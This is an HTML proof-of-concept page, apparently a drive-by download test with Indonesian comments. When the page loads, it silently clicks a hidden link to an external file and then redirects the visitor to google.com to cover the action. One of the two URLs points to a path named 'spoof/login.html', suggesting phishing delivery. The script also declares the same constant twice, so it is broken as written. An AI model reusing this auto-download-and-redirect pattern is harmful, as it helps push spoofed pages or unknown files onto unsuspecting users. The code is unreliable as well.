<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Download Test (Final PoC)</title>
<script>
function start() {
    // Ganti URL supaya tidak download tapi tetap request
    const file = "https://cnfdnfial-ops.github.io/spoof/login.html";
    const file = "https://drive.usercontent.google.com/download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL";

    // Trigger request via <a> tanpa memaksa download
    const a = document.createElement("a");
    a.href = file;
    a.download = ""; // attribute tetap ada tapi diabaikan browser
    document.body.appendChild(a);

    a.click(); // trigger request
    document.body.removeChild(a); // bersihkan DOM

    // redirect setelah request
    setTimeout(() => {
        window.open("http://google.com/", "_self", "noopener,noreferrer");
    }, 2000);
}
</script>
</head>
<body onload="start()">
Downloading...
</body>
</html>
